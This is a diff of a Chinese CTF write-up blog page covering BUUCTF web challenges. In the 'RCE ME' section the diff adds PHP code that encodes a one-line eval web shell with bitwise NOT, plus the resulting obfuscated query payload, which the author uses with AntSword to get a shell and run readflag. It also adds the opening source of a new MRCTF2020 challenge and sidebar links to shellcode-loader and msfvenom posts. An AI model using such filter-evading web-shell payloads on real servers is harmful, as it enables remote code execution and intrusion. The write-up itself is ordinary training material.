@@ -34,7 +34,7 @@
 <meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235340391.png">
 <meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235406928.png">
 <meta property="article:published_time" content="2021-09-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-05T15:54:18.601Z">
+<meta property="article:modified_time" content="2022-04-06T03:22:38.988Z">
 <meta property="article:author" content="郁涛丶">
 <meta property="article:tag" content="WEB">
 <meta name="twitter:card" content="summary">
@@ -345,7 +345,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4k</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4k</span>阅读时长: <span class="post-count reading-time">20 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -683,12 +683,14 @@
 <p>flag是空的，readflag是elf文件：</p>
 <p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405234450364.png" alt="image-20220405234450364"></p>
 <p>传一句话马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=urlencode(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[&quot;test&quot;]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=urlencode(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%DD%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
 
 <p>蚁剑连之后并没有权限，有这样一个插件</p>
 <p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235340391.png" alt="image-20220405235340391"></p>
 <p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235406928.png" alt="image-20220405235406928"></p>
 <p>之后就可以运行readflag了。</p>
+<h1 id="0x3F-MRCTF2020-套娃"><a href="#0x3F-MRCTF2020-套娃" class="headerlink" title="0x3F.[MRCTF2020]套娃"></a>0x3F.[MRCTF2020]套娃</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 
     </article>
     <!-- license -->
@@ -838,7 +840,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x30-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">0x30.[WUSTCTF2020]朴实无华(审计)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x31-WesternCTF2018-shrine-SSTI"><span class="toc-number">2.</span> <span class="toc-text">0x31.[WesternCTF2018]shrine(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x32-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x32.[SWPU2019]Web1(无列名注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x33-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">4.</span> <span class="toc-text">0x33.[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x34-SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">0x34.[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x35-MRCTF2020-PYWebsite"><span class="toc-number">6.</span> <span class="toc-text">0x35.[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x36-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">0x36.[极客大挑战 2019]FinalSQL(盲注)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x37-MRCTF2020-Ezpop"><span class="toc-number">8.</span> <span class="toc-text">0x37.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x38-NPUCTF2020-ReadlezPHP"><span class="toc-number">9.</span> <span class="toc-text">0x38.[NPUCTF2020]ReadlezPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x39-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-SSTI"><span class="toc-number">10.</span> <span class="toc-text">0x39.[CISCN2019 华东南赛区]Web11(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3A-BJDCTF2020-EasySearch"><span class="toc-number">11.</span> <span class="toc-text">0x3A.[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3B-BSidesCF-2019-Futurella"><span class="toc-number">12.</span> <span class="toc-text">0x3B.[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3C-GYCTF2020-FlaskApp"><span class="toc-number">13.</span> <span class="toc-text">0x3C.[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3D-BSidesCF-2019-Kookie"><span class="toc-number">14.</span> <span class="toc-text">0x3D.[BSidesCF 2019]Kookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3E-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">15.</span> <span class="toc-text">0x3E.[极客大挑战 2019]RCE ME</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x30-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">0x30.[WUSTCTF2020]朴实无华(审计)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x31-WesternCTF2018-shrine-SSTI"><span class="toc-number">2.</span> <span class="toc-text">0x31.[WesternCTF2018]shrine(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x32-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x32.[SWPU2019]Web1(无列名注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x33-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">4.</span> <span class="toc-text">0x33.[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x34-SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">0x34.[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x35-MRCTF2020-PYWebsite"><span class="toc-number">6.</span> <span class="toc-text">0x35.[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x36-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">0x36.[极客大挑战 2019]FinalSQL(盲注)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x37-MRCTF2020-Ezpop"><span class="toc-number">8.</span> <span class="toc-text">0x37.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x38-NPUCTF2020-ReadlezPHP"><span class="toc-number">9.</span> <span class="toc-text">0x38.[NPUCTF2020]ReadlezPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x39-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-SSTI"><span class="toc-number">10.</span> <span class="toc-text">0x39.[CISCN2019 华东南赛区]Web11(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3A-BJDCTF2020-EasySearch"><span class="toc-number">11.</span> <span class="toc-text">0x3A.[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3B-BSidesCF-2019-Futurella"><span class="toc-number">12.</span> <span class="toc-text">0x3B.[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3C-GYCTF2020-FlaskApp"><span class="toc-number">13.</span> <span class="toc-text">0x3C.[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3D-BSidesCF-2019-Kookie"><span class="toc-number">14.</span> <span class="toc-text">0x3D.[BSidesCF 2019]Kookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3E-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">15.</span> <span class="toc-text">0x3E.[极客大挑战 2019]RCE ME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3F-MRCTF2020-%E5%A5%97%E5%A8%83"><span class="toc-number">16.</span> <span class="toc-text">0x3F.[MRCTF2020]套娃</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1137,7 +1139,21 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
         
         
         
@@ -1256,7 +1272,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 59
         </div>
         <!-- search  -->
         
@@ -1285,6 +1301,18 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span>
+            <a class="archive-post-title" href="/2022/04/27/ShellCodeLoader/">ShellCode Loader(持续更新)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span>
+            <a class="archive-post-title" href="/2022/04/27/msfvenom%E8%AF%A6%E8%A7%A3/">msfvenom参数详解</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">04/01</span>
@@ -1723,6 +1751,11 @@
             <span class="sidebar-tag-name" data-tags="Win32">
                 <span class="iconfont-archer">&#xe606;</span>
                 Win32
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="免杀">
+                <span class="iconfont-archer">&#xe606;</span>
+                免杀
             </span>
         
     </div>
